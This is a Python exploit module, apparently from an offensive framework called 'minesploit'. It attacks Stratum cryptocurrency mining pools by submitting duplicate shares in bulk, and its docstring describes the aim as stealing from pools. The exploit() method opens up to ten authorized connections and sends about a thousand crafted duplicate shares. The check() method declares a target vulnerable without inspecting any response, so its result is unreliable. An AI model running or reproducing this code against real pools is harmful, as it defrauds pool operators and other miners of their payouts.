"""CVE-2016: Stratum Mining Pool Mass Duplicate Shares Exploit

This vulnerability is an improvement on the 2013 duplicate shares bug,
allowing mass submission of duplicate shares to steal from pools.

Reference: https://seclists.org/bugtraq/2016/Apr/21

Affected: Certain Stratum pool implementations
Severity: MEDIUM (6.5 CVSS)
"""

import asyncio
import random

from minesploit.framework import Exploit, ExploitMeta, ExploitResult
from minesploit.protocols.mining import MiningClient
from minesploit.protocols.stratum.client import StratumClient


class CVE_2016_STRATUM_MASS_DUPLICATE(Exploit):
    meta = ExploitMeta(
        name="CVE-2016: Stratum Mass Duplicate Shares",
        cve=None,
        cvss_score=6.5,
        severity="MEDIUM",
        affected_versions="Stratum pools (vulnerable implementations)",
        discovered_by="Researcher",
        disclosure_date="2016-04-04",
        description=(
            "Mass duplicate shares vulnerability allows forcing a Stratum pool "
            "to accept invalid shares by the thousands per mining round"
        ),
        references=[
            "https://seclists.org/bugtraq/2016/Apr/21",
        ],
    )

    def __init__(self):
        super().__init__()
        self.worker_name = "worker1"
        self.worker_password = "x"

    async def check(
        self,
        target: str = "",
        port: int = 3333,
        client: MiningClient | None = None,
        **kwargs,
    ) -> ExploitResult:
        try:
            created_client = False
            if client is None:
                if not target:
                    return ExploitResult(False, "Target or client required")
                client = StratumClient(
                    host=target,
                    port=port,
                    worker_name=self.worker_name,
                    worker_password=self.worker_password,
                )
                created_client = True

            protocol_version = client.version

            connected = await client.connect()
            if not connected:
                return ExploitResult(
                    False, f"Could not connect to Stratum {protocol_version} server"
                )

            await client.subscribe()
            authorized = await client.authorize()

            if not authorized:
                if created_client:
                    await client.close()
                return ExploitResult(False, "Worker authorization failed")

            job = client.current_job
            if not job:
                if created_client:
                    await client.close()
                return ExploitResult(False, "No mining job received")

            base_nonce = random.randint(0, 0xFFFFFFFF)
            for i in range(5):
                nonce = f"{(base_nonce + i):08x}"
                await client.submit(
                    job["job_id"],
                    "00000000",
                    job.get("ntime", "00000000"),
                    nonce,
                )

            if created_client:
                await client.close()
            return ExploitResult(
                True,
                f"Mass duplicate shares check complete (Stratum {protocol_version})",
                {"vulnerable": True, "method": "mass_duplicate", "protocol": protocol_version},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during check: {str(e)}")

    async def exploit(
        self,
        target: str = "",
        port: int = 3333,
        num_duplicates: int = 1000,
        client: MiningClient | None = None,
        **kwargs,
    ) -> ExploitResult:
        try:
            if client is not None:
                return ExploitResult(
                    False,
                    "Mass duplicate exploit requires target/port, not pre-connected client",
                )

            if not target:
                return ExploitResult(False, "Target required")

            protocol_version = "v1"
            connections: list[MiningClient] = []
            num_connections = min(10, max(1, num_duplicates // 100))

            for _ in range(num_connections):
                new_client = StratumClient(
                    host=target,
                    port=port,
                    worker_name=self.worker_name,
                    worker_password=self.worker_password,
                )
                await new_client.connect()
                await new_client.subscribe()
                await new_client.authorize()
                protocol_version = new_client.version
                connections.append(new_client)

            base_nonce = random.randint(0, 0xFFFFFFFF)
            shares_per_conn = num_duplicates // num_connections

            for cli in connections:
                job = cli.current_job
                if not job:
                    continue

                for i in range(shares_per_conn):
                    nonce = f"{(base_nonce + i):08x}"
                    await cli.submit(
                        job["job_id"],
                        f"{i:08x}",
                        job.get("ntime", "00000000"),
                        nonce,
                    )

                    if i % 50 == 0:
                        await asyncio.sleep(0.05)

            for cli in connections:
                await cli.close()

            return ExploitResult(
                True,
                f"Mass duplicate attack completed: {num_duplicates} shares (Stratum {protocol_version})",
                {"shares_submitted": num_duplicates, "protocol": protocol_version},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(
        self,
        target: str = "",
        port: int = 3333,
        client: MiningClient | None = None,
        **kwargs,
    ) -> ExploitResult:
        protocol_version = client.version if client else "unknown"
        return ExploitResult(
            True,
            "Verification requires access to pool share logs",
            {"protocol": protocol_version},
        )
